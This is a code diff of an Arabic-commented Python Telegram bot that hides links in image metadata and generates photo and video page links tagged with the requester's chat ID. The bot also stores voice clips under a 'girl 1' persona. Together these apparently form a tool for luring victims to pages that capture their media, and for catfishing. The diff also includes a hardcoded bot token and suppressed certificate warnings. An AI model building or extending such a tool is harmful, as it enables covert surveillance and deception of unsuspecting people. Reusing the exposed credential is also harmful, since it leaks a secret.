@@ -1,4 +1,3 @@
-
 import os
 import json
 import urllib3
@@ -11,7 +10,7 @@ import http.server
 # إيقاف تحذيرات الشهادات لضمان استقرار الاتصال
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إعداد توكن البوت
+# إعداد توكن البوت الجديد الخاص بك
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAFbl0cHMVXW4ZHvUQHnuWqJjf62597qBl0")
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -60,6 +59,7 @@ def hide_link_in_metadata(image_path, link, output_path):
     except Exception as e:
         print(f"خطأ ميتاداتا: {e}")
 
+# --- لوحة التحكم بالترتيب العمودي (تحت بعضها البعض) ---
 def get_main_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -70,10 +70,13 @@ def get_main_keyboard():
     )
     return markup
 
+# --- استقبال أمر البدء (الرسالة الترحيبية الرسمية) ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.send_message(message.chat.id, "المطور سيف الدين يرحب بك 🚀\nالبوت متصل بالخادم ومستعد للعمل الآن!", reply_markup=get_main_keyboard())
+    welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
+    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())
 
+# --- معالجة الضغط على الأزرار (Callback Queries) ---
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     chat_id = call.message.chat.id
@@ -82,14 +85,17 @@ def handle_query(call):
     if call.data == "inject_start":
         user_states[chat_id] = "waiting_for_image_inject"
         bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
+        
     elif call.data in ["get_photo_link", "get_video_link"]:
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
+        
     elif call.data == "voice_menu":
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
         markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
         bot.edit_message_text("اختر المجلد المطلوب:", chat_id, call.message.message_id, reply_markup=markup)
+        
     elif call.data == "girl_1_menu":
         if not db:
             bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً.")
@@ -100,8 +106,11 @@ def handle_query(call):
             if name in db: markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
         markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
         bot.edit_message_text("📂 مقاطع الفتاة 1 الكاملة:", chat_id, call.message.message_id, reply_markup=markup)
+        
     elif call.data == "main_menu":
-        bot.edit_message_text("المطور سيف الدين يرحب بك", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
+        welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
+        bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=get_main_keyboard())
+        
     elif call.data.startswith("play:"):
         name = call.data.split(":")[1]
         file_id = db.get(name)
@@ -110,11 +119,13 @@ def handle_query(call):
             except: bot.answer_callback_query(call.id, "❌ خطأ استدعاء الصوت.")
         else: bot.answer_callback_query(call.id, "❌ غير متاح.")
 
+# --- معالجة الميديا المستلمة من المستخدم (صور، نصوص، فويسات) ---
 @bot.message_handler(content_types=['photo', 'text', 'voice'])
 def handle_all(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
 
+    # حفظ فويسات الفتاة 1
     if message.voice:
         db = load_db()
         next_slot = len(db) + 1
@@ -122,7 +133,9 @@ def handle_all(message):
         name = f"مقطع {next_slot}"
         db[name] = message.voice.file_id
         save_db(db)
-        bot.reply_to(message, f"✅ تم حفظ ({name}) بنجاح!")
+        bot.reply_to(message, f"✅ تم حفظ ({name}) بنجاح وتحديث مجدل الفتاة 1!")
+        
+    # خطوة حقن الصورة الأولى
     elif state == "waiting_for_image_inject" and message.photo:
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded = bot.download_file(file_info.file_path)
@@ -130,20 +143,23 @@ def handle_all(message):
         with open(img_path, 'wb') as f: f.write(downloaded)
         user_data[chat_id] = img_path
         user_states[chat_id] = "waiting_for_link"
-        bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن للحقن:")
+        bot.reply_to(message, "📥 تم حفظ الصورة بنجاح! أرسل الآن الرابط المراد حقنه داخل ميتاداتا الصورة:")
+        
+    # خطوة حقن الرابط النصي وإرسال النتيجة
     elif state == "waiting_for_link" and message.text:
         img_path = user_data.get(chat_id)
         out_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"out_{chat_id}.png")
         hide_link_in_metadata(img_path, message.text, out_path)
         if os.path.exists(out_path):
-            with open(out_path, 'rb') as f: bot.send_photo(chat_id, f, caption=f"{message.text}")
+            with open(out_path, 'rb') as f: 
+                bot.send_photo(chat_id, f, caption=f"✅ تم حقن الميتاداتا بنجاح!\nالرابط المحقن: {message.text}")
         user_states[chat_id] = None
         if os.path.exists(img_path): os.remove(img_path)
         if os.path.exists(out_path): os.remove(out_path)
 
 if __name__ == '__main__':
-    # تشغيل السيرفر الوهمي في خلفية الكود لمنع الـ Crash
+    # تشغيل السيرفر الوهمي في الخلفية لضمان استقرار البوت على Railway
     threading.Thread(target=run_dummy_server, daemon=True).start()
     
-    print("🚀 تم تشغيل البوت بنجاح...")
+    print("🚀 تم تشغيل البوت الشامل والمستقر بنجاح...")
     bot.polling(none_stop=True, interval=0, timeout=40)
